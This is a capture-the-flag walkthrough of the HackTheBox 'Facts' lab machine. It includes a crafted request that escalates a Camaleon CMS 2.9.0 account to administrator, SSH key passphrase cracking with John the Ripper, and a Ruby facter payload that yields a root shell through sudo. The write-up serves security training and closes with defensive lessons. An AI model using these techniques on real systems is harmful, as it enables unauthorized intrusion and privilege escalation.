# HackTheBox, Facts Machine Writeup

> This writeup was created for educational purposes and demonstrates the exploitation process of the HackTheBox Facts machine in a controlled environment.

## Machine Information

| Information | Details |
|-------------|---------|
| Difficulty | Easy |
| Category | Linux |
| Platform | HackTheBox |

### Skills Required

- Web enumeration
- CMS vulnerability research
- AWS CLI interaction
- SSH key cracking
- Privilege escalation through misconfigured sudo permissions

---

# Table of Contents

- [Initial Reconnaissance](#initial-reconnaissance)
- [Directory Enumeration](#directory-enumeration)
- [Administrative Portal](#administrative-portal)
- [Vulnerability Research](#vulnerability-research)
- [Privilege Escalation](#privilege-escalation)
- [Administrative Enumeration](#administrative-enumeration)
- [SSH Key Discovery](#ssh-key-discovery)
- [SSH Key Cracking](#ssh-key-cracking)
- [User Access](#user-access)
- [Privilege Escalation to Root](#privilege-escalation-to-root)
- [Lessons Learned](#lessons-learned)

---

# Initial Reconnaissance

The assessment began by accessing the target web application through the provided IP address.

After confirming the application was reachable, the target domain was added to the local hosts file to ensure proper name resolution.

```text
10.129.3.150 facts.htb
```

![Target website landing page](images/1.png)

*Image 1: Target website landing page*

With the domain configured locally, enumeration of the web application could begin.

---

# Directory Enumeration

Directory brute forcing was performed using Gobuster to identify hidden or unlinked endpoints.

```bash
gobuster dir -u http://facts.htb/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Directory enumeration results](images/2.png)

*Image 2: Directory enumeration results*

The scan revealed multiple paths, including the important `/admin` endpoint.

---

# Administrative Portal

Accessing `/admin` revealed a login page associated with the website's content management system.

![Administrative login interface](images/3.png)

*Image 3: Administrative login interface*

After creating a user account and logging in, the application was identified as running:

```text
Camaleon CMS 2.9.0
```

![CMS version disclosure](images/4.png)

*Image 4: CMS version disclosure*

---

# Vulnerability Research

After identifying the CMS version, vulnerability research was performed to find known security issues affecting Camaleon CMS 2.9.0.

A privilege escalation vulnerability was discovered affecting the password update functionality.

![Public vulnerability reference](images/5.png)

*Image 5: Public vulnerability reference*

The vulnerability was caused by improper validation of parameters inside an AJAX password update request.

The password update feature was triggered while monitoring the browser network requests.

![AJAX request](images/6.png)

*Image 6: AJAX request generated during password update*

The request responsible for updating the password was captured.

![Password update request](images/8.png)

*Image 7: Password update request*

---

# Privilege Escalation

The captured request was modified to include an additional parameter that changed the user's role to administrator.

Example request:

```javascript
await fetch("http://facts.htb/admin/users/5/updated_ajax", {
method: "POST",
credentials: "include",
headers: {
"Content-Type": "application/x-www-form-urlencoded",
"X-CSRF-Token": "TOKEN",
"X-Requested-With": "XMLHttpRequest"
},
body: "_method=patch&password%5Bpassword%5D=1212&password%5Bpassword_confirmation%5D=1212&password%5Brole%5D=admin"
});
```

After sending the modified request and refreshing the page, the account was successfully upgraded to administrator privileges.

![Successful role escalation](images/6-after.png)

*Image 8: Successful role escalation*

---

# Administrative Enumeration

With administrator access obtained, further investigation of the CMS configuration was performed.

Inside the application settings, AWS credentials were discovered.

![AWS credentials](images/10.png)

*Image 9: Exposed AWS credentials*

The discovered credentials were configured using the AWS CLI.

```bash
aws configure
```

![AWS CLI configuration](images/11.png)

*Image 10: AWS CLI configuration*

---

# SSH Key Discovery

While exploring the available AWS resources, SSH private keys were discovered and downloaded.

![SSH key discovery](images/12.png)

![SSH key files](images/13.png)

![Downloaded SSH key](images/14.png)

---

# SSH Key Cracking

The discovered private key was protected with a passphrase.

The key was converted into a format compatible with John the Ripper.

```bash
ssh2john id_rsa > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![John the Ripper result](images/15.png)

*Image 11: SSH key cracking*

The passphrase was successfully recovered:

```text
dragonballz
```

---

# User Access

The username associated with the SSH key was identified using:

```bash
ssh-keygen -lf id_rsa
```

![SSH key metadata](images/16.png)

*Image 12: Key metadata inspection*

The key belonged to the user:

```text
trivia
```

Using the recovered passphrase, SSH access was obtained.

![SSH login](images/17.png)

*Image 13: Successful SSH authentication*

The user flag was located in the user's home directory.

![User flag](images/18.png)

*Image 14: User flag*

---

# Privilege Escalation to Root

Privilege escalation enumeration was performed using:

```bash
sudo -l
```

The output revealed that the binary:

```text
/usr/bin/facter
```

could be executed with elevated privileges.

![Sudo permissions](images/19.png)

*Image 15: Sudo permissions*

Research through GTFOBins showed that `facter` could execute arbitrary Ruby code.

![GTFOBins reference](images/20.png)

*Image 16: GTFOBins reference*

A Ruby payload was created:

```ruby
Facter.add(:pwn) do
  setcode do
    system("/bin/bash")
  end
end
```

The script was executed through the privileged binary, resulting in a root shell.

![Root shell](images/22.png)

*Image 17: Root shell obtained*

---

# Lessons Learned

- Always perform thorough enumeration before exploitation.
- Outdated CMS versions can contain critical vulnerabilities.
- Authorization checks must be properly implemented on sensitive endpoints.
- Exposed cloud credentials can lead to complete system compromise.
- SSH private keys must be protected and never exposed.
- Privileged execution of unsafe binaries can result in full system compromise.

---

# Summary

| Stage | Result |
|------|--------|
| Web Enumeration | `/admin` endpoint discovered |
| CMS Identification | Camaleon CMS 2.9.0 |
| Web Exploitation | User privilege escalation to administrator |
| Credential Discovery | AWS credentials found |
| Cloud Enumeration | SSH private keys recovered |
| Key Cracking | Passphrase recovered |
| User Access | SSH access as `trivia` |
| Root Access | Exploited `facter` sudo permission |
| Completion | User and Root flags captured |